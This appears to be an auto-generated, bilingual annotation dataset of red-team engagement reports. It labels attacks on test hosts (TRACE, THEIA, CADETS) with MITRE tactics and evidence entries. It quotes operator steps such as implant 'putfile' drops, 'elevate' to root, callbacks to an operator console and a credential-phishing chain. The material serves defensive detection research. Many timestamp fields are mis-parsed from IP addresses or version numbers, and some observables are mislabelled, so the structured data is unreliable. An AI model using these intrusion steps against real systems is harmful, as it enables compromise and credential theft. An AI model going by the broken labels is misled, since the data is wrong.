  > - L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xtmp

- `3.2.4.2` Processes (lines 305-308)

  > - L1>elevate /home/admin/cache

- `3.2.4.3` Connections (lines 309-315)

  > - exploit: www.allstate.com 145.199.103.57:80
  > - firefox: connection to 61.130.69.232:80
  > - firefox: connection to 2.233.33.53:80
  > - cache: connection to 180.156.107.146

- `3.2.5` Graph (lines 316-319)
#### 证据条目

1. `3_2_e001` | `narrative_comment` | `3.2.lead Section Lead` | lines `240-249`
   - Raw: Began attack with TRACE Ubuntu 14.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via the www.allstate.com website. The exploit resulted in the drakon implant running in memory in the Firefox process with a connection out to the attacker operator console. The attacker used putfile to write a drakon implant executable binary to the target host's disk. The attacker then executed the drakon implant from the target disk using a privilege escalated execution capability to run the new process as root. The new root drakon implant process connected out to the operator console to give the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root shells and switched over to the root shell. The attacker then wrote another file to disk to be used later and left the connection to the operator console open. Unfortunately, the operator console crashed not long after, and the connection was unintentionally lost.
   - Time: `14.04` / `2018-04-10T14:04:00`
   - Observables: domain=www.allstate.com; process_name=firefox; process_name=drakon; command=Began attack with TRACE Ubuntu 14.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via the www.allstate.com website. The exploit resulted in the drakon implant running in memory in the Firefox process with a connection out to the attacker operator console. The attacker used putfile to write a drakon implant executable binary to the target host's disk. The attacker then executed the drakon implant from the target disk using a privilege escalated execution capability to run the new process as root. The new root drakon implant process connected out to the operator console to give the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root shells and switched over to the root shell. The attacker then wrote another file to disk to be used later and left the connection to the operator console open. Unfortunately, the operator console crashed not long after, and the connection was unintentionally lost.; host=TRACE
1. `3_2_e002` | `narrative_comment` | `3.2.1 Comments` | lines `253-256`
   - Raw: Our second target was the Linux development computers. Had we been able to persist on the CADETS host, we would have performed some network recon to discover the THEIA and TRACE hosts. In this case, since that did not happen, we instead used an advertisement server to host a malicious advertisement. In this case, the exploit was sent via an ad on the www.allstate.com website. The goal
   - Time: `-` / `-`
   - Observables: domain=www.allstate.com; host=CADETS; host=TRACE; host=THEIA
1. `3_2_e003` | `narrative_comment` | `3.2.1 Comments` | lines `258-259`
   - Raw: of the attack was to drop a malicious payload to disk which would be triggered later during the engagement period via a different access method.
   - Time: `-` / `-`
   - Observables: -
1. `3_2_e004` | `narrative_comment` | `3.2.1 Comments` | lines `261-269`
   - Raw: We encountered several problems during the attack. The first exploit attempt resulted in Firefox crashing. The second attempt resulted in Firefox crashing and the TRACE host locking up for while, which resulted in a huge spike of activity in TRACE's publishing. The spike was large enough that the TRACE team noticed and contacted BBN about accessing the host to check logs. It was later determined from the logs that TRACE had dropped some records during the spike but ultimately recovered. While waiting for the system to recover, we moved on to target THEIA. As the THEIA host was also experiencing performance issues, we returned half an hour later and tried again. For some reason, the Firefox exploit failed a few more times and crashed Firefox before eventually working and resulting in a shell.
   - Time: `-` / `-`
   - Observables: process_name=firefox; host=TRACE; host=THEIA
1. `3_2_e005` | `event_log` | `3.2.2 Event Log` | lines `273-273`
   - Raw: 09:46 TRACE www.allstate.com script connect but fail firefox crash
   - Time: `09:46` / `2018-04-10T09:46:00`
   - Observables: domain=www.allstate.com; process_name=firefox; host=TRACE
1. `3_2_e006` | `event_log` | `3.2.2 Event Log` | lines `274-274`
   - Raw: 09:48 TRACE Firefox opened to www.allstate.com and fail, system locked up
   - Time: `09:48` / `2018-04-10T09:48:00`
   - Observables: domain=www.allstate.com; process_name=firefox; host=TRACE
1. `3_2_e007` | `event_log` | `3.2.2 Event Log` | lines `275-275`
   - Raw: 10:22 TRACE www.allstate.com
   - Time: `10:22` / `2018-04-10T10:22:00`
   - Observables: domain=www.allstate.com; host=TRACE
1. `3_2_e008` | `event_log` | `3.2.2 Event Log` | lines `276-276`
   - Raw: 10:26 TRACE www.allstate.com
   - Time: `10:26` / `2018-04-10T10:26:00`
   - Observables: domain=www.allstate.com; host=TRACE
1. `3_2_e009` | `event_log` | `3.2.2 Event Log` | lines `277-277`
   - Raw: 10:30 TRACE www.allstate.com crash?
   - Time: `10:30` / `2018-04-10T10:30:00`
   - Observables: domain=www.allstate.com; host=TRACE
1. `3_2_e010` | `event_log` | `3.2.2 Event Log` | lines `278-278`
   - Raw: 10:31 TRACE www.allstate.com
   - Time: `10:31` / `2018-04-10T10:31:00`
   - Observables: domain=www.allstate.com; host=TRACE
1. `3_2_e011` | `event_log` | `3.2.2 Event Log` | lines `279-279`
   - Raw: 10:40 TRACE www.allstate.com
   - Time: `10:40` / `2018-04-10T10:40:00`
   - Observables: domain=www.allstate.com; host=TRACE
1. `3_2_e012` | `event_log` | `3.2.2 Event Log` | lines `280-280`
   - Raw: OC2 2.233.33.53 (multiple failed connection attempts)
   - Time: `33.53` / `2018-04-10T33:53:00`
   - Observables: -
1. `3_2_e013` | `event_log` | `3.2.2 Event Log` | lines `281-281`
   - Raw: 10:49 TRACE www.allstate.com
   - Time: `10:49` / `2018-04-10T10:49:00`
   - Observables: domain=www.allstate.com; host=TRACE
1. `3_2_e014` | `event_log` | `3.2.2 Event Log` | lines `282-282`
   - Raw: 10:49 Received 2 connections to the OC2
   - Time: `10:49` / `2018-04-10T10:49:00`
   - Observables: -
1. `3_2_e015` | `event_log` | `3.2.2 Event Log` | lines `283-283`
   - Raw: 10:51 elevate drakon
   - Time: `10:51` / `2018-04-10T10:51:00`
   - Observables: process_name=drakon; command=10:51 elevate drakon
1. `3_2_e016` | `event_log` | `3.2.2 Event Log` | lines `284-284`
   - Raw: 10:53 quit L1
   - Time: `10:53` / `2018-04-10T10:53:00`
   - Observables: -
1. `3_2_e017` | `event_log` | `3.2.2 Event Log` | lines `285-285`
   - Raw: 10:53 quit L2
   - Time: `10:53` / `2018-04-10T10:53:00`
   - Observables: -
1. `3_2_e018` | `event_log` | `3.2.2 Event Log` | lines `286-286`
   - Raw: 11:09 putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 /var/log/xtmp
   - Time: `11:09` / `2018-04-10T11:09:00`
   - Observables: file_path=/deploy/archive/libdrakon.linux.x64.so_5.214.163.155; file_path=/var/log/xtmp; domain=libdrakon.linux; process_name=drakon; command=11:09 putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 /var/log/xtmp
1. `3_2_e019` | `event_log` | `3.2.2 Event Log` | lines `287-287`
   - Raw: Left L3 connection open
   - Time: `-` / `-`
   - Observables: -
1. `3_2_e020` | `event_log` | `3.2.2 Event Log` | lines `288-288`
   - Raw: Lost L3 connection when OC2 crashed
   - Time: `-` / `-`
   - Observables: -
1. `3_2_e021` | `address` | `3.2.3 Addresses` | lines `292-292`
   - Raw: [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 TRACE webserver
   - Time: `57:80` / `2018-04-10T57:80:00`
   - Observables: ip_port=145.199.103.57:80; ip_port=128.55.12.167:8010; host=TRACE
1. `3_2_e022` | `address` | `3.2.3 Addresses` | lines `293-293`
   - Raw: [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011   TRACE shellcode_server
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=61.130.69.232:80; ip_port=128.55.12.167:8011; host=TRACE
1. `3_2_e023` | `address` | `3.2.3 Addresses` | lines `294-294`
   - Raw: [eth0:892] 2.233.33.52:80 -> 128.55.12.167:8012    TRACE loaderDrakon.linux.x64
   - Time: `33.52` / `2018-04-10T33:52:00`
   - Observables: ip_port=2.233.33.52:80; ip_port=128.55.12.167:8012; domain=loaderDrakon.linux; process_name=drakon; process_name=loaderdrakon; host=TRACE
1. `3_2_e024` | `address` | `3.2.3 Addresses` | lines `295-295`
   - Raw: [eth0:893] 180.156.107.146:80 -> 128.55.12.167:8013 TRACE drakon.linux.x64
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=180.156.107.146:80; ip_port=128.55.12.167:8013; domain=drakon.linux; process_name=drakon; host=TRACE
1. `3_2_e025` | `address` | `3.2.3 Addresses` | lines `296-296`
   - Raw: [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014   TRACE libdrakon.linux.x64.so
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=5.214.163.155:80; ip_port=128.55.12.167:8014; process_name=drakon; host=TRACE
1. `3_2_e026` | `interaction_file` | `3.2.4.1 Files` | lines `302-302`
   - Raw: L1>putfile ./deploy/archive/drakon.linux.x64_180.156.107.146 /home/admin/cache
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/drakon.linux.x64_180.156.107.146; file_path=/home/admin/cache; domain=drakon.linux; process_name=drakon; command=L1>putfile ./deploy/archive/drakon.linux.x64_180.156.107.146 /home/admin/cache
1. `3_2_e027` | `interaction_file` | `3.2.4.1 Files` | lines `303-303`
   - Raw: L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xtmp
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.linux.x64.so_5.214.163.155; domain=libdrakon.linux; process_name=drakon; command=L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xtmp
1. `3_2_e028` | `interaction_process` | `3.2.4.2 Processes` | lines `307-307`
   - Raw: L1>elevate /home/admin/cache
   - Time: `-` / `-`
   - Observables: file_path=/home/admin/cache; command=L1>elevate /home/admin/cache
1. `3_2_e029` | `interaction_connection` | `3.2.4.3 Connections` | lines `311-311`
   - Raw: exploit: www.allstate.com 145.199.103.57:80
   - Time: `57:80` / `2018-04-10T57:80:00`
   - Observables: ip_port=145.199.103.57:80; domain=www.allstate.com
1. `3_2_e030` | `interaction_connection` | `3.2.4.3 Connections` | lines `312-312`
   - Raw: firefox: connection to 61.130.69.232:80
   - Time: `-` / `-`
   - Observables: ip_port=61.130.69.232:80; process_name=firefox
1. `3_2_e031` | `interaction_connection` | `3.2.4.3 Connections` | lines `313-313`
   - Raw: firefox: connection to 2.233.33.53:80
   - Time: `33.53` / `2018-04-10T33:53:00`
   - Observables: ip_port=2.233.33.53:80; process_name=firefox
1. `3_2_e032` | `interaction_connection` | `3.2.4.3 Connections` | lines `314-314`
   - Raw: cache: connection to 180.156.107.146
   - Time: `-` / `-`
   - Observables: -

### TRACE_20180410_1228_1230_02 / Section 4.5

- 标题：`20180410 1200 TRACE – Phishing E-mail Link`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-10T12:28:00` -> `2018-04-10T12:30:00`
- Markdown 行号：`1500-1541`
- 报告页：`36`
- 攻击概述：TRACE 用户收到冒充 Bob 的钓鱼邮件，打开邮件、点击链接、访问 www.nasa.ng、输入并提交凭证，结果被送往 www.foo1.com。
- 备注：该节主要保留 phishing link 与 credential submission 两条主证据，不把它扩展成后续驻留或 C2。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 钓鱼邮件与恶意链接构成了明确的进入方式。 | 4_5_e001, 4_5_e003, 4_5_e004, 4_5_e005 |
| EXECUTION | confirmed | 执行 | 用户实际点击并执行了恶意链接带来的交互。 | 4_5_e001, 4_5_e003, 4_5_e004, 4_5_e005 |
| CREDENTIAL_ACCESS | confirmed | 凭证获取 | 报告明确写到用户输入并提交了凭证。 | 4_5_e001, 4_5_e006, 4_5_e007, 4_5_e008 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1566.002 | confirmed | 报告明确写到 phishing e-mail with link。 | 4_5_e001, 4_5_e003, 4_5_e004, 4_5_e005 |
| T1204.001 | confirmed | 用户点击恶意链接并继续在钓鱼站点交互。 | 4_5_e001, 4_5_e003, 4_5_e004, 4_5_e005 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| phishing_link | exploit_delivery | confirmed | 报告明确写到发送 phishing e-mail，并让用户点击恶意链接。 | 4_5_e001, 4_5_e003, 4_5_e004, 4_5_e005 |
| credential_submit | credential_submit | confirmed | 用户访问 www.nasa.ng 后输入并提交 name/e-mail/password，结果发往 foo1。 | 4_5_e001, 4_5_e006, 4_5_e007, 4_5_e008 |

#### 显式观测

- `ip_port` / `208.75.117.3:80`  Evidence: `4_5_e001`  Raw: 208.75.117.3:80
- `ip_port` / `208.75.117.2:80`  Evidence: `4_5_e001`  Raw: 208.75.117.2:80
- `domain` / `www.nasa.ng`  Evidence: `4_5_e001, 4_5_e006, 4_5_e010, 4_5_e012`  Raw: www.nasa.ng
- `domain` / `www.foo1.com`  Evidence: `4_5_e001, 4_5_e008, 4_5_e011, 4_5_e013`  Raw: www.foo1.com
- `host` / `TRACE`  Evidence: `4_5_e001, 4_5_e002, 4_5_e004`  Raw: TRACE
- `host` / `THEIA`  Evidence: `4_5_e001`  Raw: THEIA
- `host` / `CADETS`  Evidence: `4_5_e002`  Raw: CADETS
- `user` / `everyone@bovia.com`  Evidence: `4_5_e003`  Raw: everyone@bovia.com
- `domain` / `bovia.com`  Evidence: `4_5_e003`  Raw: bovia.com
- `command` / `click the link`  Evidence: `4_5_e005`  Raw: click the link
- `command` / `enter creds and submit`  Evidence: `4_5_e007`  Raw: enter creds
- `ip_port` / `62.83.155.175:80`  Evidence: `4_5_e009, 4_5_e012`  Raw: 62.83.155.175:80
- `ip_port` / `128.55.12.167:8007`  Evidence: `4_5_e009`  Raw: 128.55.12.167:8007

#### 原始子节摘录

- `4.5.lead` Section Lead (lines 1502-1509)

  > The attacker ran an attack against TRACE and THEIA. The attacker got the e-mail addresses of the Bovia
  > employees from the successful phishing attack against the Bob user (ClearScope). The attacker sent a
  > phishing e-mail to others impersonating Bob. The phishing e-mail included a link to a website hosted at
  > www.nasa.ng, address 208.75.117.3:80, the same link that was used on ClearScope and Bob to initially
  > start the attack. The website hosted a form asking for name, e-mail address, and password. The user
  > unfortunately clicked on the link, entered the requested information, and submitted it. The results were
  > sent back to www.foo1.com, address 208.75.117.2:80. The attacker now has access to George's e-mail
  > account, including contact information for other Bovia company employees.

- `4.5.1` Comments (lines 1511-1515)

  > The attack worked as expected. We sent the phishing email to the TRACE user by connecting to the
  > CADETS e-mail server.

- `4.5.2` Event Log (lines 1516-1524)

  > - 12:28 Phishing email to everyone@bovia.com
  > - 12:30 TRACE open email
  > - click the link
  > - Connect to www.nasa.ng (208.75.117.3)
  > - enter creds and submit
  > - Connect to www.foo1.com (208.75.117.2)

- `4.5.3` Addresses (lines 1525-1530)

  > - [eth0:807] 62.83.155.175:80 -> 128.55.12.167:8007 phishing attack
  > - www.nasa.ng (208.75.117.3)
  > - www.foo1.com (208.75.117.2)

- `4.5.4` Interactions (lines 1531-1532)
- `4.5.4.1` Connections (lines 1533-1537)

  > - www.nasa.ng (62.83.155.175:80)
  > - www.foo1.com (208.75.117.3)

- `4.5.5` Graph (lines 1538-1541)
#### 证据条目

1. `4_5_e001` | `narrative_comment` | `4.5.lead Section Lead` | lines `1502-1509`
   - Raw: The attacker ran an attack against TRACE and THEIA. The attacker got the e-mail addresses of the Bovia employees from the successful phishing attack against the Bob user (ClearScope). The attacker sent a phishing e-mail to others impersonating Bob. The phishing e-mail included a link to a website hosted at www.nasa.ng, address 208.75.117.3:80, the same link that was used on ClearScope and Bob to initially start the attack. The website hosted a form asking for name, e-mail address, and password. The user unfortunately clicked on the link, entered the requested information, and submitted it. The results were sent back to www.foo1.com, address 208.75.117.2:80. The attacker now has access to George's e-mail account, including contact information for other Bovia company employees.
   - Time: `3:80` / `2018-04-10T03:80:00`
   - Observables: ip_port=208.75.117.3:80; ip_port=208.75.117.2:80; domain=www.nasa.ng; domain=www.foo1.com; host=TRACE; host=THEIA
1. `4_5_e002` | `narrative_comment` | `4.5.1 Comments` | lines `1513-1514`
   - Raw: The attack worked as expected. We sent the phishing email to the TRACE user by connecting to the CADETS e-mail server.
   - Time: `-` / `-`
   - Observables: host=CADETS; host=TRACE
1. `4_5_e003` | `event_log` | `4.5.2 Event Log` | lines `1518-1518`
   - Raw: 12:28 Phishing email to everyone@bovia.com
   - Time: `12:28` / `2018-04-10T12:28:00`
   - Observables: user=everyone@bovia.com; domain=bovia.com
1. `4_5_e004` | `event_log` | `4.5.2 Event Log` | lines `1519-1519`
   - Raw: 12:30 TRACE open email
   - Time: `12:30` / `2018-04-10T12:30:00`
   - Observables: host=TRACE
1. `4_5_e005` | `event_log` | `4.5.2 Event Log` | lines `1520-1520`
   - Raw: click the link
   - Time: `-` / `-`
   - Observables: command=click the link
1. `4_5_e006` | `event_log` | `4.5.2 Event Log` | lines `1521-1521`
   - Raw: Connect to www.nasa.ng (208.75.117.3)
   - Time: `-` / `-`
   - Observables: domain=www.nasa.ng
1. `4_5_e007` | `event_log` | `4.5.2 Event Log` | lines `1522-1522`
   - Raw: enter creds and submit
   - Time: `-` / `-`
   - Observables: command=enter creds and submit
1. `4_5_e008` | `event_log` | `4.5.2 Event Log` | lines `1523-1523`
   - Raw: Connect to www.foo1.com (208.75.117.2)
   - Time: `-` / `-`
   - Observables: domain=www.foo1.com
1. `4_5_e009` | `address` | `4.5.3 Addresses` | lines `1527-1527`
   - Raw: [eth0:807] 62.83.155.175:80 -> 128.55.12.167:8007 phishing attack
   - Time: `62.83` / `2018-04-10T62:83:00`
   - Observables: ip_port=62.83.155.175:80; ip_port=128.55.12.167:8007
1. `4_5_e010` | `address` | `4.5.3 Addresses` | lines `1528-1528`
   - Raw: www.nasa.ng (208.75.117.3)
   - Time: `-` / `-`
   - Observables: domain=www.nasa.ng
1. `4_5_e011` | `address` | `4.5.3 Addresses` | lines `1529-1529`
   - Raw: www.foo1.com (208.75.117.2)
   - Time: `-` / `-`
   - Observables: domain=www.foo1.com
1. `4_5_e012` | `interaction_connection` | `4.5.4.1 Connections` | lines `1535-1535`
   - Raw: www.nasa.ng (62.83.155.175:80)
   - Time: `62.83` / `2018-04-10T62:83:00`
   - Observables: ip_port=62.83.155.175:80; domain=www.nasa.ng
1. `4_5_e013` | `interaction_connection` | `4.5.4.1 Connections` | lines `1536-1536`
   - Raw: www.foo1.com (208.75.117.3)
   - Time: `-` / `-`
   - Observables: domain=www.foo1.com

### TRACE_20180412_1336_1336_03 / Section 3.12

- 标题：`20180412 1300 TRACE – Browser Extension w/ Drakon Dropper`
- 状态：`attempted_failed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-12T13:36:00` -> `2018-04-12T13:36:00`
- Markdown 行号：`965-993`
- 报告页：`22`
- 攻击概述：TRACE 上的恶意浏览器扩展攻击在 exploit 阶段就卡死，没有收到 operator console 回连。
- 备注：这一节只有 attempted 结论；没有稳定的 C2、落地执行或后续链条。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | attempted | 初始进入 | 攻击者实际触发了浏览器扩展 exploit 尝试，但未获得控制。 | 3_12_e002, 3_12_e005, 3_12_e006 |
| EXECUTION | attempted | 执行 | 浏览器扩展路径尝试执行恶意逻辑，但在挂起后失败。 | 3_12_e002, 3_12_e005, 3_12_e006 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1203 | attempted | 报告明确写到通过恶意浏览器扩展尝试 exploit。 | 3_12_e002, 3_12_e005, 3_12_e006 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| browser_extension_attempt | exploit_delivery | attempted | 报告明确写到尝试利用恶意浏览器扩展，但 Firefox 立刻挂起。 | 3_12_e002, 3_12_e005, 3_12_e006 |

#### 显式观测

- `process_name` / `firefox`  Evidence: `3_12_e001, 3_12_e002, 3_12_e006`  Raw: firefox
- `host` / `TRACE`  Evidence: `3_12_e001, 3_12_e002`  Raw: TRACE
- `ip_port` / `145.199.103.57:80`  Evidence: `3_12_e003`  Raw: 145.199.103.57:80
- `ip_port` / `128.55.12.167:8010`  Evidence: `3_12_e003`  Raw: 128.55.12.167:8010
- `ip_port` / `104.228.117.212:80`  Evidence: `3_12_e004`  Raw: 104.228.117.212:80
- `ip_port` / `128.55.12.167:8018`  Evidence: `3_12_e004`  Raw: 128.55.12.167:8018
- `domain` / `www.allstate.com`  Evidence: `3_12_e005, 3_12_e007`  Raw: www.allstate.com
- `process_name` / `drakon`  Evidence: `3_12_e005`  Raw: drakon

#### 原始子节摘录

- `3.12.lead` Section Lead (lines 967-970)

  > Tried to continue the attack against TRACE Ubuntu 14.04 but failed to do so. The attacker tried to
  > exploit the target via the malicious pass manager browser extension installed in Firefox 54.0.1. Firefox
  > browsed to the malicious website and then immediately locked up. The attacker never received a
  > connection to the operator console.

- `3.12.1` Comments (lines 972-978)

  > We tried to attack TRACE using the password manager browser extension but were unable to make it
  > that far. Firefox seemed to hang during the attack, and we never received a connection back to the
  > operator console. We reached out to BBN about rebooting the TRACE host and waited until the next
  > day to try the attack again.

- `3.12.2` Addresses (lines 979-983)

  > - [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 webserver 1
  > - [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 webserver 2

- `3.12.3` Event Log (lines 984-988)

  > - 13:36 www.allstate.com drakon browser extension
  > - 13:36 Firefox seems to hang when we try to exploit it

- `3.12.4.1` Connections (lines 991-993)

  > - exploit www.allstate.com

#### 证据条目

1. `3_12_e001` | `narrative_comment` | `3.12.lead Section Lead` | lines `967-970`
   - Raw: Tried to continue the attack against TRACE Ubuntu 14.04 but failed to do so. The attacker tried to exploit the target via the malicious pass manager browser extension installed in Firefox 54.0.1. Firefox browsed to the malicious website and then immediately locked up. The attacker never received a connection to the operator console.
   - Time: `14.04` / `2018-04-12T14:04:00`
   - Observables: process_name=firefox; host=TRACE
1. `3_12_e002` | `narrative_comment` | `3.12.1 Comments` | lines `974-977`
   - Raw: We tried to attack TRACE using the password manager browser extension but were unable to make it that far. Firefox seemed to hang during the attack, and we never received a connection back to the operator console. We reached out to BBN about rebooting the TRACE host and waited until the next day to try the attack again.
   - Time: `-` / `-`
   - Observables: process_name=firefox; host=TRACE
1. `3_12_e003` | `address` | `3.12.2 Addresses` | lines `981-981`
   - Raw: [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 webserver 1
   - Time: `57:80` / `2018-04-12T57:80:00`
   - Observables: ip_port=145.199.103.57:80; ip_port=128.55.12.167:8010
1. `3_12_e004` | `address` | `3.12.2 Addresses` | lines `982-982`
   - Raw: [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 webserver 2
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=104.228.117.212:80; ip_port=128.55.12.167:8018
1. `3_12_e005` | `event_log` | `3.12.3 Event Log` | lines `986-986`
   - Raw: 13:36 www.allstate.com drakon browser extension
   - Time: `13:36` / `2018-04-12T13:36:00`
   - Observables: domain=www.allstate.com; process_name=drakon
1. `3_12_e006` | `event_log` | `3.12.3 Event Log` | lines `987-987`
   - Raw: 13:36 Firefox seems to hang when we try to exploit it
   - Time: `13:36` / `2018-04-12T13:36:00`
   - Observables: process_name=firefox
1. `3_12_e007` | `interaction_connection` | `3.12.4.1 Connections` | lines `992-992`
   - Raw: exploit www.allstate.com
   - Time: `-` / `-`
   - Observables: domain=www.allstate.com

### TRACE_20180413_1243_1253_04 / Section 3.15

- 标题：`20180413 1200 TRACE – Pine Backdoor w/ Drakon Dropper`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-13T12:43:00` -> `2018-04-13T12:53:00`
- Markdown 行号：`1176-1257`
- 报告页：`28, 29`
- 攻击概述：TRACE 利用恶意密码管理器扩展把 drakon 写盘，再转而落盘/执行 micro apt；micro 成功回连并做端口扫描，同时删除 /tmp/ztmp 临时文件，提权尝试未能稳定成功。
- 备注：窗口保留了 failed privilege escalation 背景，但 confirmed tactics 只统计已经成功形成的执行、C2、扫描与清理行为。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 恶意浏览器扩展 exploit 成功恢复了 TRACE 上的攻击链。 | 3_15_e001, 3_15_e004, 3_15_e005 |
| EXECUTION | confirmed | 执行 | drakon/micro 由盘上链被继续执行。 | 3_15_e001, 3_15_e003, 3_15_e008, 3_15_e010 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | micro callback 是明确的控制连接。 | 3_15_e001, 3_15_e011 |
| DISCOVERY | confirmed | 侦察发现 | ps/sshd PID 与 micro portscan/netrecon 共同支撑侦察行为。 | 3_15_e006, 3_15_e007, 3_15_e001, 3_15_e012, 3_15_e014 |
| DEFENSE_EVASION | confirmed | 防御规避 | rm /tmp/ztmp 是明确的落地物清理。 | 3_15_e013 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1203 | confirmed | 通过恶意浏览器扩展重新 exploit TRACE。 | 3_15_e001, 3_15_e004, 3_15_e005 |
| T1071.001 | confirmed | micro listener 回连通过 web 风格地址建立。 | 3_15_e001, 3_15_e011 |
| T1046 | confirmed | micro portscan/netrecon 对网络服务做侦察。 | 3_15_e001, 3_15_e012, 3_15_e014 |
| T1057 | confirmed | ps/sshd PID 明确对应进程发现。 | 3_15_e006, 3_15_e007 |
| T1070.004 | confirmed | rm /tmp/ztmp 是显式文件删除。 | 3_15_e013 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| browser_extension_exploit | exploit_delivery | confirmed | 报告正文明确写到 continued attack against TRACE via malicious pass manager browser extension。 | 3_15_e001, 3_15_e004, 3_15_e005 |
| process_discovery | process_discovery | confirmed | Event Log 中有 ps 与 sshd PID。 | 3_15_e006, 3_15_e007 |
| payload_write | payload_write | confirmed | 正文明确说把 drakon executable 写到磁盘，又写入 micro apt。 | 3_15_e001, 3_15_e003, 3_15_e008 |
| payload_elevate | payload_elevate | attempted | Event Log 中出现 elevate ztmp，但正文明确说明 micro 无法完成提权。 | 3_15_e003, 3_15_e009 |
| payload_execute | payload_execute | confirmed | Event Log 中有 execfile，正文也写到 executed it from disk。 | 3_15_e003, 3_15_e010 |
| c2_callback | c2_callback | confirmed | micro callback 明确形成了对外控制连接。 | 3_15_e001, 3_15_e011 |
| network_scan | scan | confirmed | Event Log 中有 micro portscan 与 netrecon 8064。 | 3_15_e001, 3_15_e012, 3_15_e014 |
| cleanup_delete | file_delete | confirmed | ztmp 在执行后被显式删除。 | 3_15_e013 |

#### 显式观测

- `process_name` / `firefox`  Evidence: `3_15_e001`  Raw: firefox
- `process_name` / `drakon`  Evidence: `3_15_e001, 3_15_e003, 3_15_e017, 3_15_e018, 3_15_e019, 3_15_e021, 3_15_e022`  Raw: drakon
- `process_name` / `micro`  Evidence: `3_15_e001, 3_15_e002, 3_15_e003, 3_15_e011, 3_15_e012, 3_15_e025, 3_15_e026`  Raw: micro
- `host` / `TRACE`  Evidence: `3_15_e001, 3_15_e003, 3_15_e015, 3_15_e016, 3_15_e017, 3_15_e018, 3_15_e019, 3_15_e020, 3_15_e026, 3_15_e027, 3_15_e030`  Raw: TRACE
- `email_artifact` / `micro apt`  Evidence: `3_15_e001, 3_15_e002, 3_15_e003`  Raw: micro apt
- `email_artifact` / `Micro apt`  Evidence: `3_15_e001`  Raw: Micro apt
- `process_name` / `sshd`  Evidence: `3_15_e002, 3_15_e003, 3_15_e007`  Raw: sshd
- `command` / `The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to disk into the sshd process. From there, the hosts on the target network would be portscanned using the micro apt implant.`  Evidence: `3_15_e002`  Raw: inject
- `command` / `The plan did not work as expected because of process injection failing. We used the browser extension to write the drakon implant executable to disk. It connected back, and we now had an open connection to the TRACE host from executed from disk with standard user privileges. We tried to load the file staged on disk into sshd process memory but could not do so due to issues we were having with process injection on the target machines during the engagement. We settled for writing micro apt to disk and executing it. We were unable to elevate micro because after the TRACE host was rebooted the day before we did not get a chance to reinstall the elevate driver. The lack of root privileges might be why the portscan did not work as expected, but we need to test to root cause the issue.`  Evidence: `3_15_e003`  Raw: elevate
- `domain` / `allstate.com`  Evidence: `3_15_e004`  Raw: allstate.com
- `command` / `1243 ps`  Evidence: `3_15_e006`  Raw: ps
- `command` / `1246 elevate ztmp`  Evidence: `3_15_e009`  Raw: elevate
- `command` / `1247 execfile`  Evidence: `3_15_e010`  Raw: execfile
- `file_path` / `/tmp/ztmp`  Evidence: `3_15_e013`  Raw: /tmp/ztmp
- `process_name` / `netrecon`  Evidence: `3_15_e014, 3_15_e020, 3_15_e027`  Raw: netrecon
- `ip_port` / `145.199.103.57:80`  Evidence: `3_15_e015`  Raw: 145.199.103.57:80
- `ip_port` / `128.55.12.167:8010`  Evidence: `3_15_e015`  Raw: 128.55.12.167:8010
- `ip_port` / `61.130.69.232:80`  Evidence: `3_15_e016`  Raw: 61.130.69.232:80
- `ip_port` / `128.55.12.167:8011`  Evidence: `3_15_e016`  Raw: 128.55.12.167:8011
- `ip_port` / `2.233.33.52:80`  Evidence: `3_15_e017`  Raw: 2.233.33.52:80
- `ip_port` / `128.55.12.167:8012`  Evidence: `3_15_e017`  Raw: 128.55.12.167:8012
- `domain` / `loaderDrakon.linux`  Evidence: `3_15_e017, 3_15_e022`  Raw: loaderDrakon.linux
- `process_name` / `loaderdrakon`  Evidence: `3_15_e017, 3_15_e022`  Raw: loaderdrakon
- `ip_port` / `180.156.107.146:80`  Evidence: `3_15_e018`  Raw: 180.156.107.146:80
- `ip_port` / `128.55.12.167:8013`  Evidence: `3_15_e018`  Raw: 128.55.12.167:8013
